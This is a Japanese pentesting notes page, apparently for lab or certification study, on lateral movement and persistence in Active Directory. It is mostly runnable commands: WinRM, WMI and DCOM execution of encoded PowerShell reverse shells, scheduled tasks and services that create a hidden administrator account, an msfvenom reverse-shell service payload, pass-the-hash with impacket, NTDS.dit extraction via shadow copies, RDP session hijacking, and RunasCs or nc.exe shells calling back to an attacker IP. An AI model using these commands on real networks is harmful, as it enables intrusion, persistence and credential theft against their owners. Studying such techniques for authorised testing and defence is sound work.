- 関連ノート：
	- [5985(WinRM), 47001(WMI) - HTTP](../../Ports%20-%20Service/5985(WinRM),%2047001(WMI)%20-%20HTTP.md)
	- [🥝Mimikatz](../../../Tools/🥝Mimikatz.md)

>[!TIP]
>ドメインユーザーにはUACリモート制限が適用されないため、完全な権限で横展開が可能

---

# WinRM & WMI

## 1. WinRMによる横展開

### WinRM使用条件

- AdministratorsまたはRemote Management Usersグループメンバーの認証情報をもっている
- 以下のポートのいずれかがopenである
	- TCP 5985（平文HTTP）
	- TCP 5986（暗号化HTTPS）

### (a) PowerShell Remotingによる横展開

- 特徴：
    - ✅インタラクティブなセッションが可能
    - ✅永続的なセッション管理が可能

認証情報オブジェクトの作成
```powershell
# 認証情報オブジェクトの作成
$username = '<domain\username>';
$password = '<password>';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
```

(a)インタラクティブなセッションを構築
```powershell
# PSセッションの作成
New-PSSession -ComputerName <target_IP> -Credential $credential

# セッションへの接続（セッションIDは上記コマンドの出力から確認）
Enter-PSSession <SessionID>

# セッションからの切断
Exit-PSSession
```

(b)一度きりのコマンド実行(複数実行可)
```powershell
Invoke-Command -ComputerName <target_IP> -Credential $credential -ScriptBlock {
    whoami
    hostname
    Get-Process
}
```

### (b) WinRS（Windows Remote Shell）による横展開

- 特徴：
    - ✅コマンドライン経由でシンプルに実行可能
    - ❌AdministratosかRemote Management Usersグループに所属するドメインユーザーに限定して使える

基本コマンド
```powershell
winrs -r:<target_IP> -u:<username> -p:<password> "<command>"
```

具体例
```cmd
winrs -r:files04 -u:jen -p:Nexus123! "cmd /c hostname & whoami"
```

リバースシェルの実行
	[Base64化したPowerShellリバースシェルワンライナー](../../Common/Bind%20&%20Reverse%20Shell・ペイロード・安定化手法.md#Base64化したPowerShellリバースシェルワンライナー)
```cmd
winrs -r:<target_IP> -u:<username> -p:<password> "powershell -nop -w hidden -e <Base64EncodedPayload>"
```

## 2. WMIによる横展開・永続化

- [CIM（Common Information Model）](../../../Misc/用語.md#CIM（Common%20Information%20Model）)
- [WMI（Windows Management Instrumentation）](../../../Misc/用語.md#WMI（Windows%20Management%20Instrumentation）)

### WMI使用条件

- Local Administratorsグループメンバーの認証情報を持っている
- 以下ポートがopenである
	- RPC over TCP 135（リモートアクセス用）
	- TCP 19152-65535（セッションデータ用）

### 下記WMI操作で必要な準備

CIMセッションの作成
```powershell
# 認証情報オブジェクトの作成
$username = '<username>';
$password = '<password>';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

# CIMセッションの作成
$options = New-CimSessionOption -Protocol DCOM
$session = New-CimSession -ComputerName <target_IP> -Credential $credential -SessionOption $options -ErrorAction Stop
```

#### WMIを使用した横展開・永続化の手法比較表

- 用途に応じて使い分ける
	- 単発的な横展開では、[(a)コマンド（リバースシェル）の実行](#(a)コマンド（リバースシェル）の実行)を使う
	- 永続化では[(b) 悪意あるスケジュールタスクの作成](#(b)%20悪意あるスケジュールタスクの作成)を使う

| 項目      | (a)コマンド実行 | (b)タスク | (c)サービス |
| ------- | --------- | ------ | ------- |
| 実行速度    | 即座        | 速い     | 速い      |
| 永続性     | ❌ なし      | 最高     | 最高      |
| ステルス性   | 低い        | 高い     | 低い      |
| 柔軟性     | 最高        | 高い     | 限定的     |
| セットアップ  | 簡単        | 普通     | 普通      |
| クリーンアップ | 自動        | 手動     | 手動      |
| 権限レベル   | ユーザー      | SYSTEM | SYSTEM  |
| ログ痕跡    | 多い        | 中程度    | 多い      |
| 検出リスク   | 高い        | 低い     | 中       |

### (a)コマンド（リバースシェル）の実行

1. リバースシェルペイロードをエンコードする
	- [Base64化したPowerShellリバースシェルワンライナー](../../Common/Bind%20&%20Reverse%20Shell・ペイロード・安定化手法.md#Base64化したPowerShellリバースシェルワンライナー)

2. WMIで実行する
```powershell
# Base64エンコードされたリバースシェルの実行
$command = 'powershell -nop -w hidden -e <EncodedPayload>';
Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $command};
```

#### 補足：wmicコマンド

>[!Note]
>wmicは非推奨で、古い環境でしか使えない

- 特徴：
    - ✅シンプルな方法でコマンドを実行可能
    - ❌プロセスはSession 0で実行され、システムサービス専用セッションであるため、GUIは表示されない
```cmd
wmic /node:<target_IP> /user:<username> /password:<password> process call create "<command>"
```

### (b) 悪意あるスケジュールタスクの作成

任意のローカルユーザーを追加し、AdminとRDPグループに追加するサービスの作成
	※リバースシェルの場合は
	`$Command = "powershell.exe"`
	`$Arguments = '-nop -w hidden -e <EncodedPayload>'`
```powershell
# コマンドの用意（すでにユーザーが存在していても、エラーを出さないように2>nul）
$Command = "cmd.exe"
$Arguments = '/c "net user admin99 Pass123! /add 2>nul & net localgroup Administrators admin99 /add 2>nul & net localgroup \"Remote Desktop Users\" admin99 /add 2>nul"'

# アクション作成
$Action = New-ScheduledTaskAction -CimSession $session -Execute $Command -Argument $Arguments

# トリガー作成（起動時に実行する）
$Trigger = New-ScheduledTaskTrigger -AtStartup

# タスク登録（-Userで指定したユーザの権限で実行）
Register-ScheduledTask -CimSession $session -Action $Action -Trigger $Trigger -User "NT AUTHORITY\SYSTEM" -TaskName "<任意のタスク名>" -Description "<任意の説明文>" -Force

# １度だけすぐに実行
Start-ScheduledTask -CimSession $session -TaskName "<任意のタスク名>"

# コマンド実行完了を待つ
Start-Sleep -Seconds 5

# ユーザー確認
Get-CimInstance -CimSession $session -ClassName Win32_UserAccount -Filter "LocalAccount=True AND Name='admin99'"
```
- →RDPアクセス可能
- 以後、ターゲットマシンが起動ごとに実行される

スケジュールタスクの削除
```powershell
Unregister-ScheduledTask -CimSession $session -TaskName "<任意のタスク名>"
```

### (c)悪意あるサービスの作成

管理者権限を持つ認証情報を使用し、リモートマシン上でWindowsサービスを作成・実行することでコードを実行する手法

#### パターン1: ユーザー追加（RDP用足場作成）

任意のローカルユーザーを追加し、AdminとRDPグループに追加するサービスの作成
```powershell
# サービスの作成
Invoke-CimMethod -CimSession $session -ClassName Win32_Service -MethodName Create -Arguments @{
    Name = "<任意のサービス名>";
    DisplayName = "<任意の説明文>";
    PathName = 'cmd.exe /c "net user admin99 Pass123! /add && net localgroup Administrators admin99 /add && net localgroup \"Remote Desktop Users\" admin99 /add';
    ServiceType = [byte]::Parse("16");
    StartMode = "Manual"
}

# サービスの変数格納
$Service = Get-CimInstance -CimSession $session -ClassName Win32_Service -Filter "Name='<任意のサービス名>'"

# サービスの実行
Invoke-CimMethod -InputObject $Service -MethodName StartService

# コマンド実行完了まで少し待つ
Start-Sleep -Seconds 5

# ユーザー確認
Get-CimInstance -CimSession $session -ClassName Win32_UserAccount -Filter "LocalAccount=True AND Name='admin99'"
```
- →RDPアクセス可能（⚠ドメインユーザーではないので`/d:`は不要）

サービスの停止と削除
```powershell
Invoke-CimMethod -InputObject $Service -MethodName StopService
Invoke-CimMethod -InputObject $Service -MethodName Delete
```

#### パターン2: リバースシェル取得

- SMBでファイルアップロードする必要があるため、TCP 445へアクセス可能である必要あり

1. 攻撃者マシン上でペイロード作成
```bash
msfvenom -p windows/shell_reverse_tcp -f exe-service LHOST=<attacker_IP> LPORT=<Port> -o myservice.exe
```
- `-f exe-service` でSCM互換形式を生成

2. ペイロードを`Admin$`へアップロード→`%windir%`に保存される
	[ファイル操作、ユーティリティ](../../Common/ファイル操作、ユーティリティ.md#Linux%20→%20Windows%20w/%20SMB)（windows側でフォルダ用意不要）

3. 足場マシン上でサービス作成と実行
	[💥Lateral Movement & Persistance in AD](#パターン1%20ユーザー追加（RDP用足場作成）)の`PathName`を`C:\Windows\myservice.exe`に変更し、「サービスの実行」

---

# PsExec

PsExecはWindows sysinternalsスイートの１つで、telnetのように、管理者がリモートでコマンドやプロセスを実行するためにある

## PsExec使用条件

以下、２と３の条件は、Windows Serverであればデフォルト設定

1. 横展開先のlocal administratorsグループメンバーの認証情報をもっている
2. ADMIN$共有が利用可能である
3. ファイルとプリンター共有が有効で、足場と横展開先のマシン間にあるFWでSMBポート(TCP 445)が遮断されていないこと

## 足場マシンからPsExecを実行する場合

1. Psexecを足場のマシンに用意する
	- 🔗[Psexecインストール](https://learn.microsoft.com/ja-jp/sysinternals/downloads/psexec)
	- 🔗[ファイル操作、ユーティリティ](../../Common/ファイル操作、ユーティリティ.md#ファイルの転送)

2. リモートのマシンで任意のコマンドを実行する
```powershell
# 例：.\PsExec64.exe -i \\FILES04 -u corp\jen -p Nexus123! cmd
.\PsExec64.exe -i \\<TargetHost | IP> -u <domain>\<username> -p '<password>' cmd
```

## リモートからPsExecを実行する場合

```zsh
impacket-psexec '<domain>/<user>:<password>@<target_IP>' cmd
```

---

# PtH (Pass-the-Hash)

NTLM認証を悪用する攻撃であるため、（現実ではほとんどないが）Kerberosのみを使用する環境においては失敗する

## PtH成功条件

1. 横展開先のlocal administratorsグループメンバーの認証情報をもっている
2. ADMIN$共有が利用可能である
3. ファイルとプリンター共有が有効で、足場と横展開先のマシン間にあるFWでSMBポート(TCP 445)が遮断されていないこと

⚠️2014年以降、組み込みLocal Administratorsグループメンバー**以外**には使用できなくなった

## 足場マシンから実行する場合

すでに足場マシンを侵害していて、Mimikatzを実行できる場合
- [PtH(Pass-the-Hash)](../../../Tools/🥝Mimikatz.md#PtH(Pass-the-Hash))

## リモートから実行する場合

Hashのダンプ
	※横展開先でローカル管理者権限をもつユーザーとそのマシンを指定する
```zsh
impacket-secretsdump -dc-ip <DC_IP> '<domain>/<user>:<pass>@<target_IP>'
```

(a)RDP接続が可能な場合
```zsh
xfreerdp3 /d:<domain> /v:<target_IP> /u:<username> /pth:<NThash> /cert:ignore /dynamic-resolution +clipboard 
```

(b)PsExecの実行条件が整っている場合
	[PsExec使用条件](#PsExec使用条件)（リモートからはSMB445ポートがopenであることを確認）
```zsh
# LMHashは空白にして:だけNThashの前に追加
impacket-psexec -hashes :<NThash> <Username>@<target_IP>
```
- 認証情報にかかわらず、SYSTMEとしてシェルを確立

(c)WMIの実行条件が整っている場合
	[WMI使用条件](#WMI使用条件)
```zsh
# LMHashは空白にして:だけNThashの前に追加
impacket-wmiexec -hashes :<NThash> <Username>@<target_IP>
```

(d)WinRMの実行条件が整っている場合
	[WinRM使用条件](#WinRM使用条件)
```zsh
evil-winrm -i <target_IP> -u '[domain\]<username>' -H '<NThash>'
```

(e)SMB共有へアクセスするとき
	[共有の詳細列挙 & アクセス](../../Ports%20-%20Service/139,445%20-NetBIOS,%20SMB.md#共有の詳細列挙%20&%20アクセス)
```zsh
smbclient \\\\<target_IP>\\<SMB共有> -U <username> --pw-nt-hash <NTHash>
```

---

# OptH (Overpass the Hash)

[OptH(Overpass-the-Hash)](../../../Tools/🥝Mimikatz.md#OptH(Overpass-the-Hash))

---

# PtT (Pass the Ticket)

[PtT (Pass-the-Ticket)](../../../Tools/🥝Mimikatz.md#PtT(Pass-the-Ticket))

---

# DCOM

- [COM・DCOM・ActiveX](../../../Misc/用語.md#COM・DCOM・ActiveX)
- [MMC（Microsoft Management Console）](../../../Misc/用語.md#MMC（Microsoft%20Management%20Console）)
- さまざまなDCOMによる横展開テクニック：🔗[Cyberreason](https://www.cybereason.com/blog/dcom-lateral-movement-techniques)
	- （ここではこれらのテクニックのうち、"MMC20.APPLICATION"について記載）

## DCOMによる横展開手法の概要

- MMC Applicationの COM インターフェースを利用
- MMC の Application オブジェクト は `Document.ActiveView.ExecuteShellCommand` メソッドを公開しており、認証ユーザーが権限を持つ場合に任意のシェルコマンドを実行できる
- ローカル管理者であればデフォルトでこの操作が許可されるため、リモートの MMCインスタンスを生成してコマンド実行が可能
- ❌プロセスはSession 0で実行され、システムサービス専用セッションであるため、GUIは表示されない → リバースシェル用に使う

## DCOMによるリモートコマンド実行条件

- 足場と横展開先でlocal administratorsグループメンバーの認証情報をもっている
- ターゲットマシンでTCP 135がopenである（DCOMはRPCを使ってやり取りするため）

## DCOMによるリモートコマンド実行

1. 管理者としてPowerShellを起動し、リモート環境であるターゲットのMMC 2.0アプリケーションをインスタンス化する
```powershell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","<target_IP | Host>"))
```

2. リバースシェルのコマンドを実行する
	- [Base64化したPowerShellリバースシェルワンライナー](../../Common/Bind%20&%20Reverse%20Shell・ペイロード・安定化手法.md#Base64化したPowerShellリバースシェルワンライナー)
```powershell
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e <EncodedPayload>","7")
```

---

# Golden Ticket

永続化のために使うテクニック：[Golden Ticket](../../../Tools/🥝Mimikatz.md#Golden%20Ticket)

---

# Shadow Copies

- 永続化のために使うテクニック

## Shadow Copy概要

- Shadow Copyとは、Windowsのスナップショット機能で、その時点のファイルやボリュームの状態を保存したもので、Windows SDKの一部である`vshadow.exe`というツールで作成されるもの
- NTDS.dit（NT Directory Services Database)とは：ADの全データが格納されていて、Shadow Copyであればロックされていない（そのままアクセスしようとしてもロックされている）
- SYSTEM hiveとは：システム情報などが格納されているレジストリで、NTDS.ditの中身を暗号化するための暗号化キーが保存されている
	- NTDS.dit + SYSTEM hive＝　復号可能

## Shadow Copy取得条件

- Domain Admins、Enterprise Admins、DCのローカルAdministratorsグループ、Domain Controllersのいずれかのユーザーの権限
- DCにアクセスできること
- `vshadow.exe`が利用できること

## Shadow Copyからパスワードハッシュの取得

>[!WARNING]
>PowerShellでは以下の出力のパス解釈でエラーとなるため、cmd.exeで操作すること

1. DCにアクセスし、Shadow Copyを作成する
```cmd
vshadow.exe -nw -p C:
```
- 出力から"Shadow copy device name" をメモする

2. Shadow CopyからNTDS.ditをコピーする
```cmd
copy <Shadow copy device name>\windows\ntds\ntds.dit C:\ntds.dit.bak
```

3. SYSTEM hiveを取得
```cmd
reg.exe save hklm\system C:\system.bak
```

4. NTDS.ditとSYSTEM hiveを攻撃者のマシンに転送する：[ファイル操作、ユーティリティ](../../Common/ファイル操作、ユーティリティ.md)

5. NTDS.ditからすべての認証情報を抽出する
```zsh
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```
- →パスワードクラックやPtH攻撃へ...

---

# DCSync

永続化のために使うテクニック：[DCSync攻撃](../../../Tools/🥝Mimikatz.md#DCSync攻撃)
	Shadow Copyの取得よりはステルス

---

# Misc

## RDPハイジャック

- 概要：
	- 既存のRDPセッションを乗っ取る攻撃手法
	- SYSTEM権限を利用することで、パスワードなしで他のユーザーのRDPセッションに接続できる

- 使用条件：
	- **SYSTEM権限**を取得していること（管理者権限では不十分）
	- ターゲットマシン上に乗っ取り可能なRDPセッションが存在すること
	- Windows Server環境（特にServer 2016以前で確実だが、2019以降でも可能な場合がある）

1. ターゲットへの接続→管理者権限でコマンドプロンプトの起動
2. PsExecを使用してSYSTEM権限のコマンドプロンプトを起動:
	- 🔗[kali-windows-binaries - GitHub](https://github.com/interference-security/kali-windows-binaries)
```powershell
.\PsExec64.exe -s cmd.exe
```
- `-s`: SYSTEMアカウントとしてプロセスを実行

3. 既存セッションの確認
```powershell
query user
```
	↓出力例:
```
 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>administrator         rdp-tcp#6           1  Active          .  1/1/2023 10:00 AM
 jdoe                  rdp-tcp#2           3  Disc            2  1/1/2023 9:00 AM
 admin_user                                4  Disc         1:30  1/1/2023 8:30 AM
````
- STATE の意味
	- Active: 現在使用中のセッション（乗っ取ると相手が切断され、侵入がバレる）
	- Disc (Disconnected): 切断されたが終了していないセッション（推奨ターゲット）

4. セッションのハイジャック
```powershell
# 具体例：tscon 3 /dest:rdp-tcp#6
tscon <セッションID> /dest:[現在のセッション名]
```
- 現在のセッション（rdp-tcp#6）からターゲットセッション（ID: 3）にスイッチする
- SYSTEM権限で実行しているため、パスワード不要で接続可能

## 他のユーザーとしてシステムにアクセスする方法

### RunAs

他のユーザーの認証情報を使用して、そのユーザーの権限で別のプログラムを実行する。

- 用途
	- ADの認証情報を入手したが、対象マシンがSSHやRDPを有効にしておらず直接ログインできないとき
	- 入手した認証情報の権限を使ってネットワークリソース（SYSVOLやSMB共有）を列挙したいとき

- 条件
	- 認証情報を入手済み
	- 実行環境として、攻撃者側でWindowsマシンを用意するか、ターゲットのドメイン内に足場がある
	- 完全にインタラクティブなシェル（RDP等）にアクセス可能なとき

> [!NOTE] 
> 非インタラクティブシェルではパスワードプロンプトが入力を受け付けないため、RunasCs等を使う

```cmd
runas /env /profile /user:<domain>\<username> cmd.exe
```
- `/profile`：ターゲットユーザーのユーザープロファイル（レジストリやデスクトップ等）を読み込む
- `/env`：現在の環境変数を保持して新しいユーザーで実行（プロンプトも現在のユーザーのものが引き継がれる）
- `/user` の書き方：
    - ローカルユーザー：`<username>`
    - リモートPCのユーザー：`<NetBIOSコンピュータ名>\<username>`
    - ADユーザー：`<NetBIOSドメイン名>\<username>` または `<username>@<FQDN>`

> [!WARNING]
> 
> - パスワードが間違っていてもコマンド自体は実行できてしまう（成功したかどうかは別途確認が必要）
> - 攻撃者自身のWindowsマシンからrunas.exeを実行するときは、コマンドプロンプトを「管理者として実行」で開くこと。ただしこれはローカルでの特権であり、ネットワーク上の特権を付与するものではない

#### ドメイン非参加マシンからの実行（事前準備）

ADユーザーの認証情報を入手したが、ドメインに参加していないマシンで`runas`を実行する場合、DNSを設定しないとSYSVOLにアクセスできないため、先にDNS設定が必要。

1. DNS設定
```powershell
powershell -ep bypass
$dnsip = "<DC_IP>"
$index = Get-NetAdapter -Name '<Interface>' | Select-Object -ExpandProperty 'ifIndex'
Set-DnsClientServerAddress -InterfaceIndex $index -ServerAddresses $dnsip
```

2. DNS設定の確認
```powershell
nslookup <DC_FQDN>
```

3. 成功確認
```powershell
# 指定したユーザー名が表示されれば成功
whoami

# SYSVOLへのアクセス確認
dir \\<DC_FQDN>\SYSVOL\
```

### RunasCs

🔗[RunasCs - Github](https://github.com/antonioCoco/RunasCs)

- 条件：**特になし**(サービスアカウントはそもそもログインできない)
- ✅非インタラクティブシェルで別ユーザー権限のコマンド実行を可能にするツール

powershellの場合
```sh
wget https://raw.githubusercontent.com/antonioCoco/RunasCs/refs/heads/master/Invoke-RunasCs.ps1
```
```powershell
Import-Module .\Invoke-RunasCs.ps1

Invoke-RunasCs -Username <username> -Password <password> '<cmd>'

# リバースシェル取得
Invoke-RunasCs -Username <username> -Password <password> [-Domain <string>] -Command powershell.exe -Remote <attacker_IP>:<Port>

# 具体例：Invoke-RunasCs -Username svc_mssql -Password trustno1 'c:/xampp/htdocs/uploads/nc.exe 192.168.118.23 4444 -e cmd.exe'
```

cmd.exeの場合
```zsh
wget https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip
```
```powershell
# リバースシェル取得
.\RunasCs.exe <username> <password> cmd.exe -r <attacker_IP>:<Port> -l <logon_type> -b

# 任意コマンド
.\RunasCs.exe <username> <password> <command> -l <logon_type> -b
```
- `-b`, `--bypass-uac`：プロセスにUACの制限がかからないように試行する

| logon_type | 名称                   | 説明                       |
| ---------- | -------------------- | ------------------------ |
| 2          | Interactive          | 通常のログイン（デフォルト）           |
| 3          | Network              | ネットワーク認証（資格情報が保存されない）    |
| 4          | Batch                | バッチジョブ用                  |
| 5          | Service              | サービスアカウント用               |
| 8          | **NetworkCleartext** | UAC制限なし + ネットワーク認証可能（推奨） |
| 9          | NewCredentials       | `/netonly`相当（現在のトークンを維持） |
| 10         | RemoteInteractive    | RDP/リモートデスクトップ           |
| 11         | CachedInteractive    | キャッシュされた資格情報             |

### WinRM

- 条件
	- TCP 5985 or 5986がopenであること
	- WinRMサービスが有効
	- ターゲットユーザーが`Remote Management Users`グループ所属

攻撃者のマシンから
```zsh
evil-winrm -i <target_IP> -u '[domain\]<username>' -p '<password>'
```

### RDP

- 条件
	- TCP 3389がopenであること
	- ターゲットユーザーが`Remote Desktop Users`グループ所属
```zsh
xfreerdp3 /dynamic-resolution +clipboard /cert:ignore /v:<target_IP> /u:<username> /p:'<password>'
```

### スケジュールタスクの作成（schtasks）

- 条件
	- ターゲットユーザーが`Log on as a batch job`（SeBatchLogonRight ）を持っていること
```cmd
schtasks /Create /RU <username> /RP <password> /SC ONCE /TN mytask /TR "cmd.exe /c <cmd>" /ST 12:00 schtasks /Run /TN mytask
```

### PsExec（Sysinternals）

- 条件
	- port 445（SMB）がopenであること
	- ターゲットユーザーにadmin権限があること（ADMIN$共有へのwrite権限が必要）
```zsh
impacket-psexec <domain/username>:<password>@<target_IP>
```
